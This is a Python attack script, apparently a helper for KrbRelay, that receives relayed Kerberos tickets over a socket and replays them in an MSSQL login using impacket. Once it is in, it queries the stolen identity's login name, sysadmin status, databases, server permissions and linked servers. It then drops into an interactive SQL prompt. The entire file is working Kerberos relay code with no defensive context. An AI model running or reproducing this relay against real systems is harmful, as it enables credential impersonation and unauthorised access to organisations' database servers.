import argparse
import base64
import socket
import sys

from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from impacket.tds import (
    MSSQL, TDS_ENCRYPT_REQ, TDS_ENCRYPT_OFF, TDS_INIT_LANG_FATAL,
    TDS_INTEGRATED_SECURITY_ON, TDS_LOGIN, TDS_LOGIN7, TDS_ODBC_ON,
    TDS_SSPI, TDS_SSPI_TOKEN, TDS_LOGINACK_TOKEN,
)


def send_line(stream, value):
    stream.write((value + '\n').encode())
    stream.flush()


def run(stream, sql_host, sql_port):
    client = MSSQL(sql_host, sql_port)
    try:
        first = base64.b64decode(stream.readline().strip())
        assert first[:1] == b'\x60' and first[17:18] == b'\x6e', first[:20].hex()
        print('Received initial Kerberos ticket:', len(first), 'bytes', flush=True)

        blob = SPNEGO_NegTokenInit()
        blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]
        blob['MechToken'] = first[17:]

        client.connect()
        prelogin = client.preLogin()
        if prelogin['Encryption'] in (TDS_ENCRYPT_REQ, TDS_ENCRYPT_OFF):
            client.set_tls_context()

        login = TDS_LOGIN()
        login['HostName'] = b'R\x00e\x00l\x00a\x00y\x00'
        login['AppName'] = b'R\x00e\x00l\x00a\x00y\x00'
        login['ServerName'] = client.server.encode('utf-16le')
        login['CltIntName'] = login['AppName']
        login['ClientPID'] = 1
        login['PacketSize'] = client.packetSize
        login['OptionFlags2'] = TDS_INIT_LANG_FATAL | TDS_ODBC_ON | TDS_INTEGRATED_SECURITY_ON
        login['SSPI'] = blob.getData()
        login['Length'] = len(login.getData())
        client.sendTDS(TDS_LOGIN7, login.getData())
        if prelogin['Encryption'] == TDS_ENCRYPT_OFF:
            client.tlsSocket = None

        tds = client.recvTDS()
        reply = tds['Data']
        print('SQL first token:', reply[:20].hex(), 'bytes', len(reply), flush=True)
        if reply[:1] != bytes([TDS_SSPI_TOKEN]):
            parsed = client.parseReply(reply)
            for error in parsed.get(170, []):
                print('SQL error:', error['Number'], error['MsgText'].decode('utf-16le'), flush=True)
            send_line(stream, 'ERROR no SSPI continuation')
            return

        challenge = reply[3:]
        print('SQL challenge:', challenge[:20].hex(), 'bytes', len(challenge), flush=True)
        response = SPNEGO_NegTokenResp(challenge)
        response_token = response['ResponseToken']
        print('SQL Kerberos response:', response_token[:20].hex(), flush=True)
        send_line(stream, 'TOKEN ' + base64.b64encode(response_token).decode())

        second_line = stream.readline().strip()
        if not second_line:
            print('No client continuation received', flush=True)
            return
        second = base64.b64decode(second_line)
        print('Received client continuation:', second[:20].hex(), 'bytes', len(second), flush=True)

        response = SPNEGO_NegTokenResp()
        response['ResponseToken'] = second
        client.sendTDS(TDS_SSPI, response.getData())
        client.socket.settimeout(5)
        final = client.recvTDS()
        parsed = client.parseReply(final['Data'])
        print('SQL final token:', final['Data'][:20].hex(), 'keys', list(parsed), flush=True)
        for error in parsed.get(170, []):
            print('SQL error:', error['Number'], error['MsgText'].decode('utf-16le'), flush=True)
        if TDS_LOGINACK_TOKEN not in parsed:
            send_line(stream, 'ERROR no LOGINACK')
            return
        send_line(stream, 'OK LOGINACK')
        print('SQL identity:', client.sql_query(
            "SELECT SYSTEM_USER AS login_name, ORIGINAL_LOGIN() AS original_login, "
            "IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin"
        ), flush=True)
        print('SQL databases:', client.sql_query(
            "SELECT name FROM sys.databases ORDER BY name"
        ), flush=True)
        print('SQL server permissions:', client.sql_query(
            "SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER') "
            "ORDER BY permission_name"
        ), flush=True)
        print('SQL linked servers:', client.sql_query(
            "SELECT name FROM sys.servers WHERE is_linked = 1"
        ), flush=True)
        while True:
            print('SQL> ', end='', flush=True)
            query = sys.stdin.readline()
            if not query or query.strip().lower() in ('exit', 'quit'):
                break
            try:
                print('SQL rows:', client.sql_query(query.strip()), flush=True)
                for info in client.replies.get(171, []):
                    print('SQL info:', info['Number'], info['MsgText'].decode('utf-16le'), flush=True)
                for error in client.replies.get(170, []):
                    print('SQL error:', error['Number'], error['MsgText'].decode('utf-16le'), flush=True)
            except Exception as exc:
                print('SQL query error:', repr(exc), flush=True)
    finally:
        client.disconnect()


def main():
    parser = argparse.ArgumentParser(description='Relay Kerberos tokens from KrbRelay into an MSSQL TDS login')
    parser.add_argument('--listen-host', required=True, help='address reachable from KrbRelay')
    parser.add_argument('--listen-port', type=int, default=9801)
    parser.add_argument('--sql-host', required=True, help='MSSQL server address')
    parser.add_argument('--sql-port', type=int, default=1433)
    args = parser.parse_args()
    if not 1 <= args.listen_port <= 65535 or not 1 <= args.sql_port <= 65535:
        parser.error('ports must be between 1 and 65535')

    with socket.socket() as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((args.listen_host, args.listen_port))
        listener.listen(1)
        print(f'SQL relay helper listening on {args.listen_host}:{args.listen_port}', flush=True)
        while True:
            connection, peer = listener.accept()
            print('Bridge connection:', peer, flush=True)
            with connection, connection.makefile('rwb', buffering=0) as stream:
                try:
                    run(stream, args.sql_host, args.sql_port)
                except Exception as exc:
                    print('Bridge error:', repr(exc), flush=True)
                    try:
                        send_line(stream, 'ERROR ' + repr(exc))
                    except OSError:
                        pass


if __name__ == '__main__':
    main()
